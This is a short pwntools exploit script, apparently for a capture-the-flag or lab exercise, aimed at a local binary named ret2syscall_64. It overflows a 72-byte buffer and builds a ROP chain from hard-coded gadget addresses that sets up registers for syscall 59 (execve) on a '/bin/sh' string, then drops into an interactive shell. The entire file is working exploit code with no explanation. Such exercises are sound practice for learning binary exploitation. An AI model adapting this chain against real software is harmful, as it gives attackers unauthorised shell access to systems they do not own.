from pwn import *

p = process("./ret2syscall_64")

# context.terminal=["tmux",'sp','-h']
# gdb.attach(p)
offset = 72

syscall = 0x401126
pop_rax_ret = 0x401128
pop_rdi_ret = 0x4011c3
pop_rsi_r15_ret = 0x4011c1
pop_rdx_ret = 0x40112a
binsh = 0x404030
# x64 系统调用号为 59
payload = flat(['a'*offset,p64(pop_rax_ret),p64(59),p64(pop_rdi_ret),p64(binsh),p64(pop_rsi_r15_ret),p64(0),p64(0),p64(pop_rdx_ret),p64(0),p64(syscall)])

p.sendline(payload)

p.interactive()

